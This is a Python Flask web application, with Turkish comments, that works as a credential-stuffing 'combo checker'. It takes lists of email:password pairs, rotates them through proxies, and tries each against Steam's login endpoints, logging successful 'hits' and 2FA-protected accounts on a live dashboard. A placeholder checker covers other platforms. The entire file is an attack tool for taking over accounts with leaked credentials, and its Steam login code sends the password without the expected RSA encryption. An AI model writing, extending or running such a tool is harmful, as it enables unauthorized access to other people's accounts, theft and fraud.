import os
import time
import requests
from flask import Flask, request, render_template, jsonify
from threading import Thread

app = Flask(__name__)

# ======================== DURUM ========================
status = {
    "running": False,
    "platform": "",
    "total": 0,
    "success": 0,
    "fail": 0,
    "twofa": 0,
    "error": 0,
    "remaining": 0,
    "logs": ["🟢 Sistem hazır."],
    "hits": [],
    "twofa_list": []
}

# ======================== PROXY ========================
def load_proxies():
    proxies = []
    try:
        with open("proxies.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
    except:
        pass
    return proxies

def get_proxy_dict(proxy_str):
    if not proxy_str:
        return None
    if not proxy_str.startswith(("http://", "https://")):
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}

# ======================== CHECKER ========================
def check_steam(email, password, proxy_str=None):
    try:
        session = requests.Session()
        if proxy_str:
            session.proxies.update(get_proxy_dict(proxy_str))
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        
        # RSA al
        rsa = session.post("https://store.steampowered.com/login/getrsakey/", 
                           data={"donotcache": int(time.time()*1000), "username": email}, timeout=10)
        if rsa.status_code != 200:
            return "error", f"{email}:{password} API hatası"
        rsa_json = rsa.json()
        if not rsa_json.get("success"):
            return "fail", f"{email}:{password} Kullanıcı yok"

        # Giriş yap
        login = session.post("https://store.steampowered.com/login/dologin/", data={
            "username": email,
            "password": password,
            "rsatimestamp": rsa_json.get("timestamp", ""),
            "donotcache": int(time.time()*1000)
        }, timeout=10)
        result = login.json()
        
        if result.get("success"):
            return "success", f"{email}:{password} ✅ STEAM HIT!"
        elif result.get("requires_twofactor"):
            return "twofa", f"{email}:{password} 🔐 STEAM 2FA"
        else:
            return "fail", f"{email}:{password} ❌ Şifre hatalı"
    except Exception as e:
        return "error", f"{email}:{password} ⚠️ Hata: {str(e)[:30]}"

def check_generic(platform, email, password, proxy_str=None):
    # Demo checker
    if "123" in password:
        return "success", f"[{platform}] {email}:{password} ✅ HIT!"
    elif "2fa" in password.lower():
        return "twofa", f"[{platform}] {email}:{password} 🔐 2FA"
    else:
        return "fail", f"[{platform}] {email}:{password} ❌ Başarısız"

def get_checker(platform):
    if platform.lower() == "steam":
        return check_steam
    return check_generic

# ======================== ANA İŞLEM ========================
def run_checker(platform, combos):
    global status
    status["running"] = True
    status["platform"] = platform
    status["total"] = len(combos)
    status["remaining"] = len(combos)
    status["success"] = status["fail"] = status["twofa"] = status["error"] = 0
    status["logs"] = [f"🚀 {platform} başladı. Toplam: {len(combos)}"]
    status["hits"] = []
    status["twofa_list"] = []
    
    checker = get_checker(platform)
    proxies = load_proxies()
    status["logs"].append(f"🌐 {len(proxies)} proxy yüklendi")
    
    for i, combo in enumerate(combos):
        if not status["running"]:
            status["logs"].append("⏹️ Durduruldu")
            break
        parts = combo.split(":", 1)
        if len(parts) != 2:
            status["error"] += 1
            status["remaining"] -= 1
            continue
        email, password = parts[0].strip(), parts[1].strip()
        proxy = proxies[i % len(proxies)] if proxies else None
        
        result, msg = checker(email, password, proxy)
        if result == "success":
            status["success"] += 1
            status["hits"].append(msg)
        elif result == "twofa":
            status["twofa"] += 1
            status["twofa_list"].append(msg)
        elif result == "fail":
            status["fail"] += 1
        else:
            status["error"] += 1
        status["remaining"] -= 1
        status["logs"].append(msg)
        if len(status["logs"]) > 150:
            status["logs"] = status["logs"][-150:]
        time.sleep(0.3)
    
    status["running"] = False
    status["logs"].append("✅ Tamamlandı!")

# ======================== ROUTE'LAR ========================
@app.route("/")
def index():
    return render_template("index.html")  # BU DOSYA 'templates' KLASÖRÜNDE OLMALI!

@app.route("/start", methods=["POST"])
def start():
    global status
    if status["running"]:
        return jsonify({"error": "Çalışıyor zaten"}), 400
    data = request.json
    platform = data.get("platform", "steam")
    combos = [c.strip() for c in data.get("combos", "").splitlines() if c.strip()]
    if not combos:
        return jsonify({"error": "Combo girin"}), 400
    Thread(target=run_checker, args=(platform, combos)).start()
    return jsonify({"status": "started", "total": len(combos)})

@app.route("/stop", methods=["POST"])
def stop():
    status["running"] = False
    return jsonify({"status": "stopped"})

@app.route("/status")
def get_status():
    return jsonify(status)

@app.route("/test", methods=["POST"])
def test():
    proxies = load_proxies()
    return jsonify({"message": f"Test başarılı. {len(proxies)} proxy mevcut."})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
